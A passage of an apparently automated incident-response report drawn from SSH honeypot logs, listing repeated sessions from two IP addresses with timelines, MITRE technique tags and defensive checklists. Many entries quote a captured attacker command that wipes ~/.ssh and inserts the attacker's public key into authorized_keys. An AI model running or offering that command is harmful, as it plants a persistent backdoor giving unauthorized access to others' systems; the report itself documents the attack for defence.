|---|---|
| **Source IP** | `204.168.240[.]142` |
| **First Seen** | 2026-06-10 08:52 |
| **Last Seen** | 2026-06-10 08:52 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 08:52:24` | `cowrie.session.connect` |
| `2026-06-10 08:52:24` | `cowrie.client.version` |
| `2026-06-10 08:52:24` | `cowrie.client.kex` |
| `2026-06-10 08:52:25` | `cowrie.login.success` |
| `2026-06-10 08:52:25` | `cowrie.session.params` |
| `2026-06-10 08:52:25` | `cowrie.command.input` |
| `2026-06-10 08:52:25` | `cowrie.command.failed` |
| `2026-06-10 08:52:26` | `cowrie.log.closed` |
| `2026-06-10 08:52:26` | `cowrie.session.params` |
| `2026-06-10 08:52:26` | `cowrie.command.input` |
| `2026-06-10 08:52:26` | `cowrie.session.file_download` |
| `2026-06-10 08:52:26` | `cowrie.log.closed` |
| `2026-06-10 08:52:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `204.168.240[.]142` to AbuseIPDB if not already reported
- [ ] Block `204.168.240[.]142` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ef48e68fa2b

| Field | Detail |
|---|---|
| **Source IP** | `204.168.240[.]142` |
| **First Seen** | 2026-06-10 08:52 |
| **Last Seen** | 2026-06-10 08:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 08:52:28` | `cowrie.session.connect` |
| `2026-06-10 08:52:28` | `cowrie.client.version` |
| `2026-06-10 08:52:28` | `cowrie.client.kex` |
| `2026-06-10 08:52:29` | `cowrie.login.success` |
| `2026-06-10 08:52:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `204.168.240[.]142` to AbuseIPDB if not already reported
- [ ] Block `204.168.240[.]142` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48fb81473c7a

| Field | Detail |
|---|---|
| **Source IP** | `204.168.240[.]142` |
| **First Seen** | 2026-06-10 08:54 |
| **Last Seen** | 2026-06-10 08:54 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 08:54:06` | `cowrie.session.connect` |
| `2026-06-10 08:54:06` | `cowrie.client.version` |
| `2026-06-10 08:54:06` | `cowrie.client.kex` |
| `2026-06-10 08:54:07` | `cowrie.login.success` |
| `2026-06-10 08:54:07` | `cowrie.session.params` |
| `2026-06-10 08:54:07` | `cowrie.command.input` |
| `2026-06-10 08:54:07` | `cowrie.command.failed` |
| `2026-06-10 08:54:07` | `cowrie.log.closed` |
| `2026-06-10 08:54:07` | `cowrie.session.params` |
| `2026-06-10 08:54:07` | `cowrie.command.input` |
| `2026-06-10 08:54:08` | `cowrie.session.file_download` |
| `2026-06-10 08:54:08` | `cowrie.log.closed` |
| `2026-06-10 08:54:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `204.168.240[.]142` to AbuseIPDB if not already reported
- [ ] Block `204.168.240[.]142` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c5ae3c80a75

| Field | Detail |
|---|---|
| **Source IP** | `204.168.240[.]142` |
| **First Seen** | 2026-06-10 08:54 |
| **Last Seen** | 2026-06-10 08:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 08:54:10` | `cowrie.session.connect` |
| `2026-06-10 08:54:10` | `cowrie.client.version` |
| `2026-06-10 08:54:10` | `cowrie.client.kex` |
| `2026-06-10 08:54:11` | `cowrie.login.success` |
| `2026-06-10 08:54:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `204.168.240[.]142` to AbuseIPDB if not already reported
- [ ] Block `204.168.240[.]142` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d3d1ae0eae5

| Field | Detail |
|---|---|
| **Source IP** | `45.33.93[.]17` |
| **First Seen** | 2026-06-10 08:55 |
| **Last Seen** | 2026-06-10 08:55 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 08:55:13` | `cowrie.session.connect` |
| `2026-06-10 08:55:13` | `cowrie.client.version` |
| `2026-06-10 08:55:13` | `cowrie.client.kex` |
| `2026-06-10 08:55:14` | `cowrie.login.success` |
| `2026-06-10 08:55:15` | `cowrie.session.params` |
| `2026-06-10 08:55:15` | `cowrie.command.input` |
| `2026-06-10 08:55:15` | `cowrie.command.failed` |
| `2026-06-10 08:55:15` | `cowrie.log.closed` |
| `2026-06-10 08:55:15` | `cowrie.session.params` |
| `2026-06-10 08:55:15` | `cowrie.command.input` |
| `2026-06-10 08:55:16` | `cowrie.session.file_download` |
| `2026-06-10 08:55:16` | `cowrie.log.closed` |
| `2026-06-10 08:55:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.33.93[.]17` to AbuseIPDB if not already reported
- [ ] Block `45.33.93[.]17` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28c34f684821

| Field | Detail |
|---|---|
| **Source IP** | `45.33.93[.]17` |
| **First Seen** | 2026-06-10 08:55 |
| **Last Seen** | 2026-06-10 08:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 08:55:19` | `cowrie.session.connect` |
| `2026-06-10 08:55:19` | `cowrie.client.version` |
| `2026-06-10 08:55:19` | `cowrie.client.kex` |
| `2026-06-10 08:55:20` | `cowrie.login.success` |
| `2026-06-10 08:55:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.33.93[.]17` to AbuseIPDB if not already reported
- [ ] Block `45.33.93[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5fa40737425

| Field | Detail |
|---|---|
| **Source IP** | `45.33.93[.]17` |
| **First Seen** | 2026-06-10 08:57 |
| **Last Seen** | 2026-06-10 08:57 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 08:57:07` | `cowrie.session.connect` |
| `2026-06-10 08:57:07` | `cowrie.client.version` |
| `2026-06-10 08:57:07` | `cowrie.client.kex` |
| `2026-06-10 08:57:08` | `cowrie.login.success` |
| `2026-06-10 08:57:09` | `cowrie.session.params` |
| `2026-06-10 08:57:09` | `cowrie.command.input` |
| `2026-06-10 08:57:09` | `cowrie.command.failed` |
| `2026-06-10 08:57:09` | `cowrie.log.closed` |
| `2026-06-10 08:57:09` | `cowrie.session.params` |
| `2026-06-10 08:57:09` | `cowrie.command.input` |
| `2026-06-10 08:57:10` | `cowrie.session.file_download` |
| `2026-06-10 08:57:10` | `cowrie.log.closed` |
| `2026-06-10 08:57:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.33.93[.]17` to AbuseIPDB if not already reported
- [ ] Block `45.33.93[.]17` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05c06f709791

| Field | Detail |
|---|---|
| **Source IP** | `45.33.93[.]17` |
| **First Seen** | 2026-06-10 08:57 |
| **Last Seen** | 2026-06-10 08:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 08:57:13` | `cowrie.session.connect` |
| `2026-06-10 08:57:13` | `cowrie.client.version` |
| `2026-06-10 08:57:13` | `cowrie.client.kex` |
| `2026-06-10 08:57:14` | `cowrie.login.success` |
| `2026-06-10 08:57:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.33.93[.]17` to AbuseIPDB if not already reported
- [ ] Block `45.33.93[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-374b52c3af70

| Field | Detail |
|---|---|
| **Source IP** | `204.168.240[.]142` |
| **First Seen** | 2026-06-10 08:57 |
| **Last Seen** | 2026-06-10 08:57 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 08:57:36` | `cowrie.session.connect` |
| `2026-06-10 08:57:36` | `cowrie.client.version` |
| `2026-06-10 08:57:36` | `cowrie.client.kex` |
| `2026-06-10 08:57:37` | `cowrie.login.success` |
| `2026-06-10 08:57:37` | `cowrie.session.params` |
| `2026-06-10 08:57:37` | `cowrie.command.input` |
| `2026-06-10 08:57:37` | `cowrie.command.failed` |
| `2026-06-10 08:57:38` | `cowrie.log.closed` |
| `2026-06-10 08:57:38` | `cowrie.session.params` |
| `2026-06-10 08:57:38` | `cowrie.command.input` |
| `2026-06-10 08:57:38` | `cowrie.session.file_download` |
| `2026-06-10 08:57:38` | `cowrie.log.closed` |
| `2026-06-10 08:57:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `204.168.240[.]142` to AbuseIPDB if not already reported
- [ ] Block `204.168.240[.]142` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c15c7c01c0a

| Field | Detail |
|---|---|
| **Source IP** | `204.168.240[.]142` |
| **First Seen** | 2026-06-10 08:57 |
| **Last Seen** | 2026-06-10 08:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 08:57:40` | `cowrie.session.connect` |
| `2026-06-10 08:57:40` | `cowrie.client.version` |
| `2026-06-10 08:57:40` | `cowrie.client.kex` |
| `2026-06-10 08:57:41` | `cowrie.login.success` |
| `2026-06-10 08:57:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `204.168.240[.]142` to AbuseIPDB if not already reported
- [ ] Block `204.168.240[.]142` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a0bc835653c

| Field | Detail |
|---|---|
| **Source IP** | `204.168.240[.]142` |
| **First Seen** | 2026-06-10 08:59 |
| **Last Seen** | 2026-06-10 08:59 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 08:59:18` | `cowrie.session.connect` |
| `2026-06-10 08:59:18` | `cowrie.client.version` |
| `2026-06-10 08:59:19` | `cowrie.client.kex` |
| `2026-06-10 08:59:19` | `cowrie.login.success` |
| `2026-06-10 08:59:20` | `cowrie.session.params` |
| `2026-06-10 08:59:20` | `cowrie.command.input` |
| `2026-06-10 08:59:20` | `cowrie.command.failed` |
| `2026-06-10 08:59:20` | `cowrie.log.closed` |
| `2026-06-10 08:59:20` | `cowrie.session.params` |
| `2026-06-10 08:59:20` | `cowrie.command.input` |
| `2026-06-10 08:59:20` | `cowrie.session.file_download` |
| `2026-06-10 08:59:20` | `cowrie.log.closed` |
| `2026-06-10 08:59:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `204.168.240[.]142` to AbuseIPDB if not already reported
- [ ] Block `204.168.240[.]142` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-683f505a7993

| Field | Detail |
|---|---|
| **Source IP** | `204.168.240[.]142` |
| **First Seen** | 2026-06-10 08:59 |
| **Last Seen** | 2026-06-10 08:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 08:59:22` | `cowrie.session.connect` |
| `2026-06-10 08:59:22` | `cowrie.client.version` |
| `2026-06-10 08:59:22` | `cowrie.client.kex` |
| `2026-06-10 08:59:23` | `cowrie.login.success` |
| `2026-06-10 08:59:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `204.168.240[.]142` to AbuseIPDB if not already reported
- [ ] Block `204.168.240[.]142` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-810ac4282ee3

| Field | Detail |
|---|---|
| **Source IP** | `204.168.240[.]142` |
| **First Seen** | 2026-06-10 09:09 |
| **Last Seen** | 2026-06-10 09:09 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 09:09:32` | `cowrie.session.connect` |
| `2026-06-10 09:09:32` | `cowrie.client.version` |
| `2026-06-10 09:09:32` | `cowrie.client.kex` |
| `2026-06-10 09:09:32` | `cowrie.login.success` |
| `2026-06-10 09:09:33` | `cowrie.session.params` |
| `2026-06-10 09:09:33` | `cowrie.command.input` |
| `2026-06-10 09:09:33` | `cowrie.command.failed` |
| `2026-06-10 09:09:33` | `cowrie.log.closed` |
| `2026-06-10 09:09:33` | `cowrie.session.params` |
| `2026-06-10 09:09:33` | `cowrie.command.input` |
| `2026-06-10 09:09:33` | `cowrie.session.file_download` |
| `2026-06-10 09:09:33` | `cowrie.log.closed` |
| `2026-06-10 09:09:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `204.168.240[.]142` to AbuseIPDB if not already reported
- [ ] Block `204.168.240[.]142` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98b36c2de36d

| Field | Detail |
|---|---|
| **Source IP** | `204.168.240[.]142` |
| **First Seen** | 2026-06-10 09:09 |
| **Last Seen** | 2026-06-10 09:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 09:09:35` | `cowrie.session.connect` |
| `2026-06-10 09:09:35` | `cowrie.client.version` |
| `2026-06-10 09:09:36` | `cowrie.client.kex` |
| `2026-06-10 09:09:36` | `cowrie.login.success` |
| `2026-06-10 09:09:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `204.168.240[.]142` to AbuseIPDB if not already reported
- [ ] Block `204.168.240[.]142` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7fb49c274d76

| Field | Detail |
|---|---|
| **Source IP** | `204.168.240[.]142` |
| **First Seen** | 2026-06-10 09:12 |
| **Last Seen** | 2026-06-10 09:13 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 09:12:58` | `cowrie.session.connect` |
| `2026-06-10 09:12:58` | `cowrie.client.version` |
| `2026-06-10 09:12:59` | `cowrie.client.kex` |
| `2026-06-10 09:12:59` | `cowrie.login.success` |
| `2026-06-10 09:12:59` | `cowrie.session.params` |
| `2026-06-10 09:12:59` | `cowrie.command.input` |
| `2026-06-10 09:12:59` | `cowrie.command.failed` |
| `2026-06-10 09:13:00` | `cowrie.log.closed` |
| `2026-06-10 09:13:00` | `cowrie.session.params` |
| `2026-06-10 09:13:00` | `cowrie.command.input` |
| `2026-06-10 09:13:00` | `cowrie.session.file_download` |
| `2026-06-10 09:13:00` | `cowrie.log.closed` |
| `2026-06-10 09:13:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `204.168.240[.]142` to AbuseIPDB if not already reported
- [ ] Block `204.168.240[.]142` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e7488e97dee

| Field | Detail |
|---|---|
| **Source IP** | `204.168.240[.]142` |
| **First Seen** | 2026-06-10 09:13 |
| **Last Seen** | 2026-06-10 09:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 09:13:02` | `cowrie.session.connect` |
| `2026-06-10 09:13:02` | `cowrie.client.version` |
| `2026-06-10 09:13:02` | `cowrie.client.kex` |
| `2026-06-10 09:13:03` | `cowrie.login.success` |
| `2026-06-10 09:13:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `204.168.240[.]142` to AbuseIPDB if not already reported
- [ ] Block `204.168.240[.]142` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aeae60680852

| Field | Detail |
|---|---|
| **Source IP** | `45.33.93[.]17` |
| **First Seen** | 2026-06-10 09:13 |
| **Last Seen** | 2026-06-10 09:13 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 09:13:14` | `cowrie.session.connect` |
| `2026-06-10 09:13:14` | `cowrie.client.version` |
